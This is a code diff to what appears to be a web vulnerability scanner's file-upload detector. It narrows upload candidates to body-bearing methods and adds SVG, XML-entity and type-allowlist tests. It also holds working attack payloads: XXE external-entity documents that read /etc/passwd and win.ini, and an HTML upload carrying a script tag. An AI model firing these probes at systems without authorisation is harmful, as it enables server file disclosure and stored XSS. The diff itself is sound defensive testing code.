@@ -30,6 +30,18 @@ class UploadCandidate:
 class FileUploadDetector(BaseDetector):
     name = "file_upload"
 
+    # A file upload is a state-changing operation: it is carried only by a
+    # request method with a meaningful body (POST/PUT/PATCH). GET/HEAD/DELETE/
+    # OPTIONS candidates are never upload sinks — they arise when the crawler
+    # observed a plain data request to a URL that superficially matched an upload
+    # field/path heuristic. Testing them produces false positives: a GET data
+    # endpoint ignores the multipart body, so every file type yields an identical
+    # 2xx (and an oversized body is rejected 413 by the framework's *generic*
+    # request-size limit, not any upload validator), which trips the accept/reject
+    # differential (Test 8). Restricting candidates to body-bearing methods is
+    # framework- and target-agnostic.
+    _UPLOAD_METHODS = frozenset({"POST", "PUT", "PATCH"})
+
     _upload_paths = [
         "uploads/",
         "files/",
@@ -92,6 +104,18 @@ class FileUploadDetector(BaseDetector):
                 )
 
         candidates.extend(self._api_upload_candidates(kwargs))
+
+        # Drop candidates whose method cannot carry a file upload (see
+        # _UPLOAD_METHODS). A GET/HEAD/DELETE endpoint is not an upload sink;
+        # testing it manufactures accept-differential false positives.
+        non_upload = [c for c in candidates if (c.method or "").upper() not in self._UPLOAD_METHODS]
+        if non_upload:
+            logger.info(
+                "file_upload: dropping %d non-upload-method candidate(s): %s",
+                len(non_upload),
+                ", ".join(sorted({f"{c.method} {c.url}" for c in non_upload})),
+            )
+        candidates = [c for c in candidates if (c.method or "").upper() in self._UPLOAD_METHODS]
 
         if not candidates:
             logger.info(
@@ -171,6 +195,11 @@ class FileUploadDetector(BaseDetector):
                     ),
                     confidence_score=95.0,
                     detection_method="file_upload_execution",
+                    detection_evidence={
+                        "canary_executed": True,
+                        "accessible_url": accessible_url,
+                        "uploaded_filename": php_name,
+                    },
                     reproducible=True,
                     verified=True,
                 ))
@@ -199,6 +228,12 @@ class FileUploadDetector(BaseDetector):
                     ),
                     confidence_score=95.0,
                     detection_method="content_type_bypass_execution",
+                    detection_evidence={
+                        "canary_executed": True,
+                        "accessible_url": accessible_url,
+                        "uploaded_filename": php_name,
+                        "spoofed_content_type": "image/jpeg",
+                    },
                     reproducible=True,
                     verified=True,
                 ))
@@ -217,6 +252,11 @@ class FileUploadDetector(BaseDetector):
                     ),
                     confidence_score=65.0,
                     detection_method="content_type_bypass_response_evidence",
+                    detection_evidence={
+                        "canary_executed": False,
+                        "uploaded_filename": php_name,
+                        "spoofed_content_type": "image/jpeg",
+                    },
                     reproducible=False,
                     verified=False,
                 ))
@@ -246,6 +286,11 @@ class FileUploadDetector(BaseDetector):
                     ),
                     confidence_score=95.0,
                     detection_method="double_extension_execution",
+                    detection_evidence={
+                        "canary_executed": True,
+                        "accessible_url": accessible_url,
+                        "uploaded_filename": dbl_name,
+                    },
                     reproducible=True,
                     verified=True,
                 ))
@@ -264,6 +309,10 @@ class FileUploadDetector(BaseDetector):
                     ),
                     confidence_score=65.0,
                     detection_method="double_extension_response_evidence",
+                    detection_evidence={
+                        "canary_executed": False,
+                        "uploaded_filename": dbl_name,
+                    },
                     reproducible=False,
                     verified=False,
                 ))
@@ -300,6 +349,326 @@ class FileUploadDetector(BaseDetector):
                     reproducible=bool(accessible_url),
                     verified=bool(accessible_url),
                 ))
+
+        # --- Test 5: SVG image-validation bypass (stored-XSS-capable image) ---
+        await self._test_svg_image_bypass(client, findings, candidate, site_root)
+
+        # --- Test 6: XML entity-parser differential (bounded, safe) ---
+        await self._test_xml_parser(client, findings, candidate)
+
+        # --- Test 7: real XXE — external entity file disclosure (reflected) ---
+        await self._test_xxe_external_entity(client, findings, candidate)
+
+        # --- Test 8: type-allowlist bypass (accept-differential, no retrieval) ---
+        # A secure upload endpoint enforces a type allowlist and REJECTS dangerous
+        # active-content / executable types. When a benign allowed type AND a
+        # dangerous active-content type are accepted IDENTICALLY, the endpoint
+        # applies no server-side file-type validation (CWE-434) — a real weakness
+        # even when the stored file is never served back (so Tests 1-5, which all
+        # require retrieval/execution to confirm, stay silent).
+        #
+        # Zero-FP anchor: we ALSO require the endpoint to REJECT an oversized upload.
+        # That proves it runs real server-side upload validation (a size guard), so
+        # accepting the dangerous type is a genuine gap — not a permissive stub that
+        # merely echoes 2xx to everything (which we cannot distinguish from a real
+        # handler and must not flag). Framework-agnostic: keyed on the accept/reject
+        # differential, never on a target path.
+        already_flagged = any(
+            f.url == form_url
+            and f.vuln_type in {
+                "Unrestricted File Upload",
+                "Missing File Type Validation",
+                "Weak File Upload Validation",
+            }
+            for f in findings
+        )
+        if not already_flagged:
+            benign_ok, benign_resp = await self._send_upload(
+                client, candidate, "sentry_ok.pdf", b"%PDF-1.4\n%sentry benign\n", "application/pdf",
+            )
+            danger_name = "sentry_active.html"
+            danger_ok, danger_resp = await self._send_upload(
+                client, candidate, danger_name,
+                b"<!doctype html><script>/*SENTRY_UPLOAD_TYPE*/</script>", "text/html",
+            )
+            # A file large enough to trip any reasonable size guard. A validating
+            # handler rejects it; a blind accept-everything stub does not.
+            oversize_ok, _oversize_resp = await self._send_upload(
+                client, candidate, "sentry_big.pdf", b"%PDF-1.4\n" + b"A" * (512 * 1024), "application/pdf",
+            )
+            if (
+                benign_ok
+                and danger_ok
+                and benign_resp.status_code == danger_resp.status_code
+                and not oversize_ok
+            ):
+                findings.append(Finding(
+                    category=OwaspCategory.a01,
+                    vuln_type="Missing File Type Validation",
+                    severity=SeverityLevel.medium,
+                    url=form_url,
+                    parameter=file_field,
+                    method=method,
+                    payload=danger_name,
+                    evidence=(
+                        "Upload endpoint enforces server-side validation (an oversized upload was "
+                        "rejected) but applies NO file-type allowlist: a benign 'application/pdf' file "
+                        "and a dangerous active-content 'text/html' file were both accepted with an "
+                        f"identical HTTP {danger_resp.status_code} response (CWE-434). If such an upload "
+                        "is later served from this origin it enables stored XSS or code execution; "
+                        "storage/retrieval was not confirmed here."
+                    ),
+                    confidence_score=70.0,
+                    detection_method="upload_type_allowlist_bypass_differential",
+                    detection_evidence={
+                        "benign_content_type": "application/pdf",
+                        "benign_status": benign_resp.status_code,
+                        "dangerous_content_type": "text/html",
+                        "dangerous_status": danger_resp.status_code,
+                        "oversize_rejected": True,
+                        "retrieval_confirmed": False,
+                    },
+                    reproducible=True,
+                    verified=True,
+                ))
+
+    # A bounded, entirely internal XML entity. There is NO external reference
+    # (no SYSTEM/http/file) and NO recursive expansion, so it can never cause an
+    # SSRF, file read, or billion-laughs blow-up — it only reveals whether the
+    # parser expands entities at all, a precondition for XXE.
+    _XML_ENTITY_CANARY = "SENTRY_XXE_ENTITY_CANARY"
+    _XML_ENTITY_DOC = (
+        '<?xml version="1.0"?>'
+        f'<!DOCTYPE sentry [<!ENTITY probe "{_XML_ENTITY_CANARY}">]>'
+        "<sentry>&probe;</sentry>"
+    ).encode()
+    _XML_CONTROL_DOC = (
+        '<?xml version="1.0"?><sentry>SENTRY_XML_CONTROL</sentry>'
+    ).encode()
+
+    # External-entity (real XXE) probes. Each references a benign, universally
+    # present read-only OS file; the signature is content that appears ONLY when
+    # the parser resolves the external entity and reflects it — never in our own
+    # payload — so a match is undeniable proof of arbitrary file disclosure (zero
+    # false positive). Read-only and bounded (one small doc per probe). No SSRF,
+    # no write, no recursion. Covers the two dominant server OS families so the
+    # check is target-agnostic (a Linux or Windows backend each has one hit).
+    _XXE_CANARY = "SENTRY_XXE_EXT"
+    _XXE_EXTERNAL_PROBES = (
+        ("file:///etc/passwd", re.compile(r"root:.*?:0:0:", re.I)),
+        ("file:///c:/windows/win.ini", re.compile(r"\[(?:extensions|fonts|mci extensions)\]", re.I)),
+    )
+
+    # Tokens that mark an endpoint as a likely document/data parser rather than a
+    # plain image/avatar upload. Deliberately excludes the ubiquitous
+    # ``upload``/``file`` tokens (which match nearly every candidate) so the XML
+    # entity probe stays off image forms and only fires on parser-like surfaces.
+    _XML_PARSER_TOKENS = (
+        "xml", "import", "document", "doc", "parse", "feed", "sitemap",
+        "svg", "convert", "ingest",
+    )
+
+    def _looks_xml_parser_candidate(self, candidate: UploadCandidate) -> bool:
+        """True when the candidate endpoint plausibly parses uploaded XML.
+
+        Gated so the bounded XML entity probe fires only on document/import/parse-
+        like endpoints (or fields), never on every avatar/image form. A field or
+        URL token match is enough; verification still requires a real response
+        differential, so a loose gate cannot manufacture a finding.
+        """
+        haystack = f"{candidate.url} {candidate.file_field}".lower()
+        for token in candidate.data or {}:
+            haystack += f" {str(token).lower()}"
+        return any(token in haystack for token in self._XML_PARSER_TOKENS)
+
+    async def _test_svg_image_bypass(
+        self,
+        client: httpx.AsyncClient,
+        findings: list[Finding],
+        candidate: UploadCandidate,
+        site_root: str,
+    ) -> None:
+        """Upload a tiny SVG carrying a canary; confirm via retrieval.
+
+        An SVG accepted as an image and served inline is script-capable (stored
+        XSS). Bounded (a few hundred bytes) and non-destructive; reported only
+        when the uploaded canary is retrievable, mirroring the other subchecks.
+        """
+        svg_name = "sentry_test.svg"
+        svg_content = (
+            '<?xml version="1.0"?>'
+            '<svg xmlns="http://www.w3.org/2000/svg">'
+            "<text>SENTRY_UPLOAD_TEST_CANARY</text></svg>"
+        ).encode()
+        accepted, response = await self._send_upload(
+            client, candidate, svg_name, svg_content, "image/svg+xml",
+        )
+        if not accepted:
+            return
+        candidate_urls = self._extract_candidate_urls(response, candidate.url, site_root, svg_name)
+        accessible_url = await self._find_canary(client, candidate_urls, "SENTRY_UPLOAD_TEST_CANARY")
+        if not accessible_url:
+            return
+        findings.append(Finding(
+            category=OwaspCategory.a01,
+            vuln_type="Unrestricted File Upload",
+            severity=SeverityLevel.high,
+            url=candidate.url,
+            parameter=candidate.file_field,
+            method=candidate.method,
+            payload=svg_name,
+            evidence=(
+                "SVG image upload accepted and retrievable at "
+                f"{accessible_url}; SVG served inline can execute script (stored XSS)."
+            ),
+            confidence_score=85.0,
+            detection_method="svg_image_upload_persistence",
+            detection_evidence={
+                "canary_executed": False,
+                "accessible_url": accessible_url,
+                "uploaded_filename": svg_name,
+            },
+            reproducible=True,
+            verified=True,
+        ))
+
+    async def _test_xml_parser(
+        self,
+        client: httpx.AsyncClient,
+        findings: list[Finding],
+        candidate: UploadCandidate,
+    ) -> None:
+        """Exercise a multipart XML endpoint with a bounded internal-entity doc.
+
+        Sends a benign control document and an internal-entity document (no
+        external/SYSTEM reference, no recursion) and compares. If the entity's
+        expanded value appears in the response, entity expansion is verified;
+        if only the response differs consistently, a probable signal is recorded.
+        Never reports on the benign control alone.
+        """
+        if not self._looks_xml_parser_candidate(candidate):
+            return
+        control_accepted, control_resp = await self._send_upload(
+            client, candidate, "sentry_control.xml", self._XML_CONTROL_DOC, "text/xml",
+        )
+        entity_accepted, entity_resp = await self._send_upload(
+            client, candidate, "sentry_entity.xml", self._XML_ENTITY_DOC, "text/xml",
+        )
+        if not entity_accepted:
+            return
+        entity_body = entity_resp.text or ""
+        # Strongest signal: the parser expanded the internal entity and reflected
+        # its value (the raw entity name is gone, the canary text is present).
+        if self._XML_ENTITY_CANARY in entity_body and "&probe;" not in entity_body:
+            findings.append(Finding(
+                category=OwaspCategory.a05,
+                vuln_type="XML Entity Expansion",
+                severity=SeverityLevel.medium,
+                url=candidate.url,
+                parameter=candidate.file_field,
+                method=candidate.method,
+                payload="sentry_entity.xml",
+                evidence=(
+                    "Uploaded XML had its internal entity expanded and reflected in "
+                    "the response — the parser resolves entities, a precondition for "
+                    "XXE. Bounded internal-only entity was used (no external fetch)."
+                ),
+                confidence_score=70.0,
+                detection_method="xml_entity_expansion_reflected",
+                detection_evidence={"parser_expands_entities": True},
+                reproducible=True,
+                verified=True,
+            ))
+            return
+        # Weaker signal: the entity doc is processed differently from the benign
+        # control (accepted/rejected divergence or a parser error only on entity).
+        control_body = control_resp.text or ""
+        entity_error = self._has_error_terms(entity_body)
+        control_error = control_accepted and not self._has_error_terms(control_body)
+        if control_error and entity_error:
+            findings.append(Finding(
+                category=OwaspCategory.a05,
+                vuln_type="XML Parser Behavior - Probable",
+                severity=SeverityLevel.low,
+                url=candidate.url,
+                parameter=candidate.file_field,
+                method=candidate.method,
+                payload="sentry_entity.xml",
+                evidence=(
+                    "A multipart XML endpoint processed a benign control document but "
+                    "errored on a document containing an internal entity, indicating "
+                    "server-side XML entity handling worth manual XXE review."
+                ),
+                confidence_score=45.0,
+                detection_method="xml_parser_control_differential",
+                detection_evidence={"proof_type": "control_differential"},
+                reproducible=False,
+                verified=False,
+            ))
+
+    async def _test_xxe_external_entity(
+        self,
+        client: httpx.AsyncClient,
+        findings: list[Finding],
+        candidate: UploadCandidate,
+    ) -> None:
+        """Upload an XML doc with an EXTERNAL entity and detect reflected file read.
+
+        This is the genuine XXE test (distinct from ``_test_xml_parser``, which
+        uses an internal-only entity to detect mere entity expansion). Each probe
+        references a benign read-only OS file via a ``file://`` SYSTEM entity; the
+        finding fires ONLY when the referenced file's content is reflected in the
+        response, which is undeniable proof the parser resolved the external
+        entity and disclosed a server-side file. Fires on any upload candidate
+        (an XML sink may be reached even through a field named ``file``); the
+        reflection requirement makes it zero-FP on endpoints that ignore the XML
+        or strip entities, so no parser-token gate is needed. Bounded, read-only,
+        non-destructive.
+        """
+        for uri, signature in self._XXE_EXTERNAL_PROBES:
+            doc = (
+                '<?xml version="1.0" encoding="UTF-8"?>'
+                f'<!DOCTYPE sentry [<!ENTITY xxe SYSTEM "{uri}">]>'
+                f"<sentry><probe>{self._XXE_CANARY}&xxe;</probe></sentry>"
+            ).encode()
+            try:
+                _accepted, response = await self._send_upload(
+                    client, candidate, "sentry_xxe.xml", doc, "application/xml",
+                )
+            except Exception:
+                continue
+            body = response.text or ""
+            match = signature.search(body)
+            # The signature is reflected file content, never present in our
+            # payload — any match proves external-entity resolution + disclosure.
+            if not match:
+                continue
+            disclosed = body[match.start(): match.start() + 80]
+            findings.append(Finding(
+                category=OwaspCategory.a05,
+                vuln_type="XML External Entity (XXE) Injection",
+                severity=SeverityLevel.high,
+                url=candidate.url,
+                parameter=candidate.file_field,
+                method=candidate.method,
+                payload="sentry_xxe.xml",
+                evidence=(
+                    "Uploaded XML with an external SYSTEM entity "
+                    f"({uri}) was resolved server-side and the referenced file's "
+                    "content was reflected in the response — arbitrary file "
+                    f"disclosure via XXE. Disclosed content: {disclosed!r}."
+                ),
+                confidence_score=95.0,
+                detection_method="xxe_external_entity_file_read",
+                detection_evidence={
+                    "entity_uri": uri,
+                    "reflected_file_content": disclosed,
+                    "file_disclosed": True,
+                },
+                reproducible=True,
+                verified=True,
+            ))
+            return
 
     async def _send_upload(
         self,
@@ -360,7 +729,7 @@ class FileUploadDetector(BaseDetector):
 
         upload_name = lambda name: any(
             token in (name or "").lower()
-            for token in ("file", "upload", "avatar", "image", "document", "attachment")
+            for token in ("file", "upload", "avatar", "image", "document", "attachment", "import")
         )
 
         for target in AttackSurface.build(
@@ -412,7 +781,7 @@ class FileUploadDetector(BaseDetector):
             url = str(getattr(endpoint, "url", "") or "")
             body = getattr(endpoint, "request_body", None)
             if "multipart/form-data" not in content_type and not (
-                url and any(token in url.lower() for token in ("upload", "file", "avatar", "image", "document"))
+                url and any(token in url.lower() for token in ("upload", "file", "avatar", "image", "document", "import"))
             ):
                 continue
             fields = list(body.keys()) if isinstance(body, dict) else []
